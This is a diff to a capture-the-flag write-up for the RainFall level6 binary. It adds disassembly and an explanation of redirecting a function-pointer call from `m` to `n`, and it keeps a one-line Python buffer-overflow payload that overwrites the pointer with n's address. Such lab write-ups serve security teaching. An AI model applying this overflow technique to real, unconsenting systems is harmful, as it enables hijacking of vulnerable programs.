@@ -9,9 +9,17 @@ segfaults unless we pass an argument to the `main` function.
     level6@RainFall:~$ ./level6 test
     Nope
 ```
+This program is very much like this of level1: function `n` makes a syscall, but the function itself is never called within the program. But `m` (0x8048468) is.
 
-This program is very much like this of level1: function `n` makes a syscall, but the function itself is never called within the
-program. Once again, simply push the address to function `n` on top of the stack so it executes properly.
+```
+    0x080484a5 <+41>:	mov    edx,0x8048468
+    [...]
+    0x080484b8 <+60>:	mov    edx,eax
+    [...]
+    0x080484d0 <+84>:	call   eax
+```
+
+Once again, simply push the address to function `n` on top of the stack so it executes `n` instead of `m`. 
 
 ```
     level6@RainFall:~$ ./level6 $(python -c 'print "a"*72 + "\x54\x84\x04\x08"')
